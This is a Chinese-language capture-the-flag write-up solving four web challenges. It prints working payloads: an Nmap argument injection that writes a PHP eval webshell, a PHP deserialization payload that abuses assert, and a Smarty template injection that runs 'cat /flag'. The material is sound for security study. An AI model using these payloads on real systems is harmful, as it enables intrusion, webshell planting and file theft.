## [ASIS 2019]Unicorn shop

[[ASIS 2019]Unicorn shop](https://blog.csdn.net/qq_41891666/article/details/107224411)

看了它的源码，主要是这个函数

```
unicodedata.numeric(price)
```

```python
import unicodedata

a = unicodedata.numeric('百')

print(a)
```

结果

```
100.0
```

> ##### 功能
>
> 把一个表示数字的字符串转换为浮点数返回的函数
>  注意: Unicode字符(chr),不是字符串

在这个网站上https://www.compart.com/en/unicode/

找到unicode字符ↈ，这个字符就是浮点数100000.0

经过测试，发现只有第四个商品能买

![image-20240315161711978](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240315161711978.png)

得到flag

另外，还可以用中文的万字，亿字等

```
万，亿
```

## [网鼎杯 2020 朱雀组]Nmap

> nmap的一些参数
>
> -iL 读取文件内容，以文件内容作为搜索目标
> -o 输出到文件
> -oN 标准保存
> -oX XML保存
> -oG Grep保存
> -oA 保存到所有格式

可以利用-oN写木马，也可以用-iL读取flag

方法一：

payload

```
' <? eval($_POST[1]); -oN 1.phtml '
```

```
<? eval($_POST[1]); -oN 1.phtml '
```

源码里有这两个函数

```
$host = escapeshellarg($host);
$host = escapeshellcmd($host);
```

> **escapeshellcmd()** 对字符串中可能会欺骗     shell 命令执行任意命令的字符进行转义。  
>
>  反斜线（\）会在以下字符之前插入：`&#;`|`*?~<>^()[]{}$\`、`\x0A`    和 `\xFF`。 `'` 和 `"`    仅在不配对儿的时候被转义。在 Windows 平台上，所有这些字符以及 `%`    和 `!` 字符前面都有一个插入符号（`^`）。 
>
> **escapeshellarg()** 用转义符转义所有单引号，然后用单引号包裹，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。

方法二：

payload

```
' -iL /flag -oN 1.txt '
```

## [NPUCTF2020]ReadlezPHP

```php
<?php
#error_reporting(0);
class HelloPhp
{
    public $a;
    public $b;
    public function __construct(){
        $this->a = "Y-m-d h:i:s";
        $this->b = "date";
    }
    public function __destruct(){
        $a = $this->a;
        $b = $this->b;
        echo $b($a);
    }
}
$c = new HelloPhp;

if(isset($_GET['source']))
{
    highlight_file(__FILE__);
    die(0);
}

@$ppp = unserialize($_GET["data"]); 
```



payload

```php
<?php
class HelloPhp
{
    public $a;
    public $b;

    public function __construct()
    {
        $this->a = "phpinfo()";
        $this->b = "assert";
    }
}
$c = new HelloPhp();

echo serialize($c);
```

flag在phpinfo里

他这里过滤了一大堆函数，还能用assert

![image-20240315174432266](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240315174432266.png)

## [CISCN2019 华东南赛区]Web11

题目提示xff头

那就修改一下xff头

```
X-Forwarded-For: 127.0.0.1
```

发现ip变成了127.0.0.1

![image-20240315181508664](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240315181508664.png)

猜测可能有ssti漏洞

```
{{1*1}}
```

发现成功回显

根据报错，发现是smarty模板

![image-20240315181809785](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240315181809785.png)

查看版本

```
{$smarty.version}
```

3.1.30

```
{if system('cat /flag')}{/if}
```

得到flag

